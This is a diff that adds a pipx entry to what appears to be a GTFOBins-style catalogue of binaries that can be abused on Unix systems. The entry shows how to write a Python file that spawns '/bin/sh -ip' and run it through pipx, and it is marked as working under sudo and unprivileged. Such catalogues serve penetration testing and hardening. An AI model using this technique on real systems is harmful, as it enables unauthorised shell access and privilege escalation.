@@ -1,0 +1,25 @@
+{
+  "comment": "pipx can run Python code provided in a local script.",
+  "functions": {
+    "inherit": [
+      {
+        "code": "echo 'import os; os.system(\"/bin/sh -ip\")' >/path/to/file.py\npipx run /path/to/file.py\n",
+        "comment": "This runs Python code (`import os; os.system(\"/bin/sh -ip\")`) from the specified file.",
+        "contexts": {
+          "sudo": {},
+          "unprivileged": {}
+        },
+        "from": "python"
+      }
+    ],
+    "shell": [
+      {
+        "code": "pipx run /path/to/file.py\n",
+        "contexts": {
+          "sudo": {},
+          "unprivileged": {}
+        }
+      }
+    ]
+  }
+}
